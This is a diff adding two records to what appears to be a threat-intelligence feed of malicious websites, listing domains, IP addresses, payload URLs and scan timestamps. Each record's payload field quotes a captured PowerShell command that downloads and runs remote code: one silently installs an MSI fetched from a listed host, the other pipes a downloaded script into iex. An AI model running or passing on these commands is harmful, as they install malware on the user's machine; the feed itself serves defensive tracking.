@@ -223,5 +223,46 @@
     ],
     "ReportId": "cmwgilzy30lfb0oml5aansa6p",
     "ScannedAt": "2026-11-14T14:42:42.917000+00:00"
+  },
+  {
+    "UrlDomain": "atharvarealties.com",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "91.108.98.209"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwgmq76i0lru0omlkr8mx6sp",
+    "ScannedAt": "2026-11-14T16:37:57.382000+00:00"
+  },
+  {
+    "UrlDomain": "rohrsupport.de",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "87.106.41.189"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/a3a0979350a6065b",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/a3a0979350a6065b'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/a3a0979350a6065b"
+    ],
+    "ReportId": "cmwgmq2yd0lr20omlqz1zffk5",
+    "ScannedAt": "2026-11-14T16:37:51.895000+00:00"
   }
 ]
